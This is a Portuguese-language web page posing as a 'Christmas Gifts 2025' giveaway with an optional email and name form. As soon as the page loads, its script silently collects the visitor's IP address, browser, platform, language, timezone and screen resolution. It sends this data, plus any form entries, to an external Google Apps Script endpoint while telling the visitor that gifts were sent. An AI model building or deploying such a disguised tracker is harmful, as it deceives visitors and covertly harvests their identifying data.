<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<title>Prendas Natal 2025</title>
<style>
  body {
    font-family: Arial, sans-serif;
    max-width: 600px;
    margin: 40px auto;
    line-height: 1.5;
  }
  .box {
    padding: 20px;
    border: 1px solid #ccc;
    border-radius: 8px;
  }
  label {
    font-weight: bold;
    margin-top: 10px;
    display: block;
  }
  input {
    width: 100%;
    padding: 8px;
    margin-top: 5px;
  }
  button {
    background: #007bff;
    color: white;
    padding: 12px 20px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    margin-top: 15px;
    font-size: 16px;
  }
  button:hover {
    background: #0056b3;
  }
  #status {
    margin-top: 20px;
    font-weight: bold;
  }
</style>
</head>

<body>
<div class="box">
  <h2>Prendas Natal 2025</h2>

  <label for="email">Email (opcional):</label>
  <input type="email" id="email" placeholder="Email">

  <label for="firstName">Primeiro Nome (opcional):</label>
  <input type="text" id="firstName" placeholder="First Name">

  <label for="lastName">Último Nome (opcional):</label>
  <input type="text" id="lastName" placeholder="Last Name">

  <button onclick="sendAll()">Enviar Todos as Prendas</button>

  <p id="status">A recolher prendas de Natal...</p>
</div>

<script>
let technicalData = {}; // Guardar dados técnicos automaticamente

// Função para recolher dados técnicos
async function collectTechnicalData() {
  const status = document.getElementById("status");
  status.innerText = "A recolher prendas de Natal...";

  try {
    const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());

    technicalData = {
      ip: ipData.ip,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenResolution: `${window.screen.width}x${window.screen.height}`
    };

    // Enviar automaticamente os dados técnicos
    await fetch("https://script.google.com/macros/s/AKfycbxgiVBbuNnc0msBdurBjNRmJK9IFrh6cdaT32P07mimH_39-3_OrdQukZiQZBXFTU86/exec", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(technicalData)
    });

    status.innerText = "Prendas Enviadas!";
  } catch (err) {
    console.error(err);
    status.innerText = "Erro ao enviar prendas.";
  }
}

// Função para enviar todos os campos junto com os dados técnicos
async function sendAll() {
  const status = document.getElementById("status");

  const email = document.getElementById("email").value.trim();
  const firstName = document.getElementById("firstName").value.trim();
  const lastName = document.getElementById("lastName").value.trim();

  const data = {
    ...technicalData,
    email: email || "",
    firstName: firstName || "",
    lastName: lastName || ""
  };

  try {
    await fetch("https://script.google.com/macros/s/AKfycbxgiVBbuNnc0msBdurBjNRmJK9IFrh6cdaT32P07mimH_39-3_OrdQukZiQZBXFTU86/exec", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(data)
    });

    status.innerText = "Todas as prendas enviadas!";
  } catch (err) {
    console.error(err);
    status.innerText = "Erro ao enviar prendas.";
  }
}

// Executa automaticamente ao carregar a página
collectTechnicalData();
</script>
</body>
</html>
